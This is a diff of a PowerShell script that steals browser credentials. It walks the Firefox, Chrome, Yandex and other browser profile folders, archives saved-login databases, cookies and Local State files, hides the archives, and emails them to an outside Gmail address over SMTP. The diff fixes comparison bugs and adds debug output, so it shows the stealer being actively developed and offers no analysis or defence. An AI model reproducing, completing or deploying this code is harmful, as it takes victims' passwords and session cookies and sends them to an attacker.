@@ -2,7 +2,7 @@
 echo "qwe"
 $e=""
 # $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
-if(Test-Path "C:\Program Files\7-Zip\117z.exe"){
+if(Test-Path "C:\Program Files\7-Zip\222227z.exe"){
   cd "C:\Program Files\7-Zip\"
   $arh="7"
 }
@@ -11,16 +11,8 @@ elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
   $arh="W"
 }
 else{echo "asd"}
+echo $arh
 
-# $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
-# >> #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
-# >>
-# >>
-# >> #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
-# >> $file="C:\Users\qwe\Desktop\sdsdas.png"
-# >> [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
-# >> [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
-# >> $ZipFile.Dispose()
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
         2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
@@ -36,18 +28,23 @@ for ($i=0; $i -lt 5; $i++){
   $ReportEmail.From="f7swwq@gmail.com"
   $ReportEmail.To.Add("keklol2045@gmail.com")
   if(Test-Path $lst[$i][0]){
-    echo '+++++++++'
+    echo '+++++++++', $arh, '+++++++++'
     echo ($lst[$i][0])
-    $p=($env:TEMP+"\"+$lst[$i][1]+".zip")
+    $p=($env:TEMP+"\"+$lst[$i][1])
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
-    if($arh="7"){
-       .\7z.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
+    if($arh-eq "7"){
+      $p=($p+".zip")
+     .\7z.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
 #      Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
-       }
-    elseif($arh="W"){
-      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 -m5 -hput #-inul
+     }
+    elseif($arh-eq "W"){
+    echo ($p+".zip")
+      echo "_________________"
+      $p=($p+".rar")
+      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3  #-hput #-inul
     }
     else{
+      $p=($p+".zip")
       gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
     }
     attrib +H $p
@@ -59,10 +56,10 @@ for ($i=0; $i -lt 5; $i++){
     #echo "SEND!!!"
     $SMTPInfo.Send($ReportEmail)
 #     $s.Dispose()
+  echo '----------', $arh, '----------'
   }
   else{
     echo ($lst[$i][1]) #$e=$e+' '+$lst[$i][1]#     
-#     $ReportEmail.Subject=("Error: ", $lst[$i][1])
   }
 }
 
@@ -76,3 +73,12 @@ $w=$env:TEMP+'\w.txt'
 # echo "dadasdasdasdasasd"
 #######################
 # exit
+# $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
+# >> #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
+# >>
+# >>
+# >> #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
+# >> $file="C:\Users\qwe\Desktop\sdsdas.png"
+# >> [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
+# >> [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
+# >> $ZipFile.Dispose()
